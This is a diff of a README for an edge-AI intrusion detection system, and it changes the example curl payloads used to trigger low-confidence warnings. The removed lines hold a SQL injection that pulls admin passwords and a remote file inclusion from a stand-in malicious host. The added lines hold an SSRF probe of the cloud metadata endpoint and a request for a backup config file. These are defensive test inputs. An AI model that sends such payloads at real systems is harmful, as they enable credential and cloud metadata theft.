@@ -92,8 +92,8 @@ A decentralized, Edge AI-powered Intrusion Detection System with a Continuous Le
 
 *Low Confidence Warnings (Ambiguous Payloads):*
 
-    curl "http://localhost:8080/api/users?id=1%20UNION%20SELECT%20password%20FROM%20admin"
-    curl "http://localhost:8080/index.php?page=http://malicious.com/shell.txt"
+    curl "http://localhost:8080/image-proxy?url=http://169.254.169.254/latest/meta-data/"
+    curl "http://localhost:8080/admin/config.php.bak"
 
 ### 🧠 Triggering Continuous Learning
 
